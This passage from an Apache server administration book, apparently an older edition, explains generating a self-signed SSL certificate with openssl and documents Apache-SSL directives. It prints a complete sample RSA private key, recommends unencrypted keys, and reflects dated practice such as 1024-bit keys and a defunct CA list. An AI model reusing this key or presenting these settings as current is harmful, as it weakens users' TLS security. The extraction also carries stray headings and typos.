 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
Using configuration from ../SSLconf/conf/ssleay.cnf 
Generating a 1024 bit RSA private key 
...........++++++ 
..........++++++ 
writing new private key to '../SSLconf/conf/httpsd.pem' 
----- 
You are about to be asked to enter information that will be 
incorporated 
into your certificate request. 
What you are about to enter is what is called a Distinguished Name or a 
DN. 
There are quite a few fields but you can leave some blank 
For some fields there will be a default value, 
If you enter '.', the field will be left blank. 
----- 
Country Name (2 letter code) [GB]:US 
State or Province Name (full name) [Some-State]:Nevada 
Locality Name (eg, city) []:Hopeful City 
Organization Name (eg, company; recommended) []:Butterthlies Inc 
Organizational Unit Name (eg, section) []:Sales 

server name (eg. ssl.domain.tld; required!!!) []:sales.butterthlies.com 
Email Address []:sales@butterthlies.com 
Your inputs are shown in bold type in the usual way. The only one that genuinely matters 
is "server name," which must be the fully qualified domain name (FQDN) of your server. 
This has to be correct because your client's security-conscious browser will check to see 
that this address is the same as that being accessed. To see the result, go to the directory 
above, then down into .../SSLConf/conf. You should see something like this in the file 
httpsd.pem (yours should not be identical to this, of course):  
-----BEGIN RSA PRIVATE KEY----- 
MIICXAIBAAKBgQDBpDjpJQxvcPRdhNOflTOCyQp1Dhg0kBruGAHiwxYYHdlM/z6k 
pi8EJFvvkoYdesTVzM+6iABQbk9fzvnG5apxy8aB+byoKZ575ce2Rg43i3KNTXY+ 
RXUzy/5HIiL0JtX/oCESGKt5W/xd8G/xoKR5Qe0P+1hgjASF2p97NUhtOQIDAQAB 
AoGALIh4DiZXFcoEaP2DLdBCaHGT1hfHuU7q4pbi2CPFkQZMU0jgPz140psKCa7I 
6T6yxfi0TVG5wMWdu4r+Jp/q8ppQ94MUB5oOKSb/Kv2vsZ+T0ZCBnpzt1eia9ypX 
ELTZhngFGkuq7mHNGlMyviIcq6Qct+gxd9omPsd53W0th4ECQQDmyHpqrrtaVlw8 
aGXbTzlXp14Bq5RG9Ro1eibhXId3sHkIKFKDAUEjzkMGzUm7Y7DLbCOD/hdFV6V+ 
pjwCvNgDAkEA1szPPD4eB/tuqCTZ+2nxcR6YqpUkT9FPBAV9Gwe7Svbct0yu/nny 
bpv2fcurWJGI23UIpWScyBEBR/z34El3EwJBALdw8YVtIHT9IlHN9fCt93mKCrov 
JSyF1PBfCRqnTvK/bmUij/ub+qg4YqS8dvghlL0NVumrBdpTgbO69QaEDvsCQDVe 
P6MNH/MFwnGeblZr9SQQ4QeI9LOsIoCySGod2qf+e8pDEDuD2vsmXvDUWKcxyZoV 
Eufc/qMqrnHPZVrhhecCQCsP6nb5Aku2dbhX+TdYQZZDoRE2mkykjWdK+B22C2/4 
C5VTb4CUF7d6ukDVMT2d0/SiAVHBEI2dR8Vw0G7hJPY= 
-----END RSA PRIVATE KEY----- 
-----BEGIN CERTIFICATE----- 
MIICvTCCAiYCAQAwDQYJKoZIhvcNAQEEBQAwgaYxCzAJBgNVBAYTAlVTMQ8wDQYD 
VQQIEwZOZXZhZGExFTATBgNVBAcTDEhvcGVmdWwgQ2l0eTEZMBcGA1UEChMQQnV0 
dGVydGhsaWVzIEluYzEOMAwGA1UECxMFU2FsZXMxHTAbBgNVBAMTFHd3dy5idXR0 
ZXJ0aGxpZXMuY29tMSUwIwYJKoZIhvcNAQkBFhZzYWxlc0BidXR0ZXJ0aGxpZXMu 
Y29tMB4XDTk4MDgyNjExNDUwNFoXDTk4MDkyNTExNDUwNFowgaYxCzAJBgNVBAYT 
AlVTMQ8wDQYDVQQIEwZOZXZhZGExFTATBgNVBAcTDEhvcGVmdWwgQ2l0eTEZMBcG 
A1UEChMQQnV0dGVydGhsaWVzIEluYzEOMAwGA1UECxMFU2FsZXMxHTAbBgNVBAMT 
FHd3dy5idXR0ZXJ0aGxpZXMuY29tMSUwIwYJKoZIhvcNAQkBFhZzYWxlc0BidXR0 
ZXJ0aGxpZXMuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBpDjpJQxv 
cPRdhNOflTOCyQp1Dhg0kBruGAHiwxYYHdlM/z6kpi8EJFvvkoYdesTVzM+6iABQ 
bk9fzvnG5apxy8aB+byoKZ575ce2Rg43i3KNTXY+RXUzy/5HIiL0JtX/oCESGKt5 
W/xd8G/xoKR5Qe0P+1hgjASF2p97NUhtOQIDAQABMA0GCSqGSIb3DQEBBAUAA4GB 
AIrQjOfQTeOHXBS+zcXy9OWpgcfyxI5GQBg6VWlRlhthEtYDSdyNq9hrAT/TGUwd 
Jm/whjGLtD7wPx6c0mR/xsoWWoEVa2hIQJhDlwmnXk1F3M55ZA3Cfg0/qb8smeTx 
7kM1LoxQjZL0bg61Av3WG/TtuGqYshpE09eu77ANLngp 
-----END CERTIFICATE----- 
This is rather an atypical certificate, because it combines our private key with the 
certificate. You would probably want to separate them and make the private key readable 
only by root (see later in this section). Also, the certificate is signed by ourselves, making 
it a root certification authority certificate; this is just a convenience for test purposes. In 
the real world, root CAs are likely to be somewhat more impressive organizations than 
we are. However, this is functionally the same as a "real" certificate: the important 
difference is that it is cheaper and quicker to obtain than the real one.  

This certificate is also without a passphrase, which httpsd would otherwise ask for at 
startup. We think a passphrase is a bad idea because it prevents automatic server restarts, 
but if you want to make yourself a certificate that incorporates one, edit Makefile 
(remembering to re-edit if you run Configuration again), find the "certificate:" section, 
remove the -nodes flag, and proceed as before. Or, follow this procedure, which will also 
be useful when we ask one of the following CAs for a proper certificate. Go to 
.../SSLConf/conf. Type:  
% openssl req -new -outform PEM> new.cert.csr 
... 
writing new private key to 'privkey.pem' 
enter PEM pass phrase: 
Type in your passphrase, and then answer the questions as before. You are also asked for 
a challenge password — we used "swan." This generates a Certificate Signing Request 
(CSR) with your passphrase encrypted into it using your private key, plus the information 
you supplied about who you are and where you operate. You will need this if you want to 
get a server certificate. You send it to the CA of your choice. If he can decrypt it using 
your public key, he can then go ahead to check — more or less thoroughly — that you 
are who you say you are.  
However, if you then decide you don't want a passphrase after all because it makes 
Apache harder to start — see earlier — you can remove it with this:  
% openssl rsa -in privkey.pem -out privkey.pem 
Of course, you'll need to enter your passphrase one last time. Either way, you then 
convert the request into a signed certificate:  
% openssl x509 -in new1.cert.csr -out new1.cert.cert -req -signkey 
      privkey.pem 
As we noted earlier, it would be sensible to restrict the permissions of this file to root 
alone. Use:  
chmod  u=r,go= privkey.pem 
You now have a secure version of Apache (httpsd), a certificate (new1.cert.cert), a 
Certificate Signing Request (new1.cert.csr), and a signed key (privkey.pem).  
11.7.5 Getting a Server Certificate 
If you want a more convincing certificate than the one we made previosly, you should go 
to one o the followingf:  
Resellers at http://resellers.tucows.com/products/  
Thawte Consulting, at http://www.thawte.com/certs/server/request.html  
CertiSign Certificadora Digital Ltda., at http://www.certisign.com.br  

IKS GmbH, at http://www.iks-jena.de/produkte/ca/  
BelSign NV/SA, at http://www.belsign.be  
Verisign, Inc. at http://www.verisign.com/guide/apache  
TC TrustCenter (Germany) at 
http://www.trustcenter.de/html/Produkte/TC_Server/855.htm  
NLsign B.V. at http://www.nlsign.nl  
Deutsches Forschungsnetz at http://www.pca.dfn.de/dfnpca/certify/ssl/  
128i Ltd. (New Zealand) at http://www.128i.com  
Entrust.net Ltd. at http://www.entrust.net/products/index.htm  
Equifax Inc. at http://www.equifax.com/ebusinessid/  
GlobalSign NV/SA at http://www.GlobalSign.net  
NetLock Kft. (Hungary) at http://www.netlock.net  
Certplus SA (France) at http://www.certplus.com  
These all may have slightly different procedures, since there is no standard format for a 
CSR. We suggest you check out what the CA of your choice wants before you embark on 
buying a certificate.  
11.7.6 The Global Session Cache 
SSL uses a session key to secure each connection. When the connection starts, 
certificates are checked, and a new session key is agreed between the client and server 
(note that because of the joys of public-key encryption, this new key is only known to the 
client and server). This is a time-consuming process, so Apache-SSL and the client can 
conspire to improve the situation by reusing session keys. Unfortunately, since Apache 
uses a multiprocess execution model, there's no guarantee that the next connection from 
the client will use the same instance of the server. In fact, it is rather unlikely. Thus, it is 
necessary to store session information in a cache that is accessible to all the instances of 
Apache-SSL. This is the function of the gcache program. It is controlled by the 
SSLCacheServerPath, SSLCacheServerPort, SSLSessionCacheTimeout directives for 
Apache v1.3, and SSLSessionCache for Apache v2, described later in this chapter.  
11.8 SSL Directives 
Apache-SSL's directives for Apache v1.3 follow, with the new ones introduced by v2 
after that. Then there is a small section at the end of the chapter concerning cipher suites.  
11.8.1 Apache-SSL Directives for Apache v1.3 
SSLDisable 
  
 
SSLDisable 
Server config, virtual host 
Not available in Apache v2 
  

This directive disables SSL. This directive is useful if you wish to run both secure and 
nonsecure hosts on the same server. Conversely, SSL can be enabled with SSLEnable. 
We suggest that you use this directive at the start of the file before virtual hosting is 
specified.  
SSLEnable 
  
 
SSLEnable 
Server config, virtual host 
Not available in Apache v2 
  
This directive enables SSL. The default; but if you've used SSLDisable in the main 
server, you can enable SSL again for virtual hosts using this directive.  
SSLRequireSSL 
  
 
SSLRequireSSL 
Server config, .htaccess, virtual host, directory 
Apache v1.3, v2 
  
This directive requires SSL. This can be used in <Directory> sections (and elsewhere) 
to protect against inadvertently disabling SSL. If SSL is not in use when this directive 
applies, access will be refused. This is a useful belt-and-suspenders measure for critical 
information.  
SSLDenySSL 
  
 
SSLDenySSL 
Server config, .htaccess, virtual host, directory 
Not available in Apache v2 
  
The obverse of SSL RequireSSL, this directive denies access if SSL is active. You might 
want to do this to maintain the server's performance. In a complicated Config file, a 
section might inadvertently have SSL enabled and would slow things down: this directive 
would solve the problem — in a crude way.  
SSLCacheServerPath 
  
 
SSLCacheServerPath filename 
Server config 
Not available in Apache v2 
  

This directive specifies the path to the global cache server, gcache. It can be absolute or 
relative to the server root.  
SSLCacheServerRunDir 
  
 
SSLCacheServerRunDir directory 
Server config 
Not available in Apache v2 
  
This directive sets the directory in which gcache runs, so that it can produce core dumps 
during debugging.  
SSLCacheServerPort 
  
 
SSLCacheServerPort file|port 
Server config 
Not available in Apache v2 
  
The cache server can use either TCP/IP or Unix domain sockets. If the file or port 
argument is a number, then a TCP/IP port at that number is used; otherwise, it is assumed 
to be the path to use for a Unix domain socket.  
Points to watch: 
• 
If you use a number, make sure it is not a TCP socket that could be used by any 
other package. There is no magical way of doing this: you are supposed to know 
what you are doing. The command netstat -an | grep LISTEN will tell you 
what sockets are actually in use, but of course, others may be latent because the 
service that would use them is not actually running.  
• 
If you opt for a Unix domain socket by quoting a path, make sure that the 
directory exists and has the appropriate permissions.  
• 
The Unix domain socket will be called by the "filename" part of the path, but do 
not try to create it in advance, because you can't. If you create a file there, you 
will prevent the socket forming properly.  
SSLSessionCacheTimeout 
  
 
SSLSessionCacheTimeout time_in_seconds 
Server config, virtual host 
Available in Apache v 1.3, v2 
  
A session key is generated when a client connects to the server for the first time. This 
directive sets the length of time in seconds that the session key will be cached locally. 

Lower values are safer (an attacker then has a limited time to crack the key before a new 
one will be used) but also slower, because the key will be regenerated at each timeout. If 
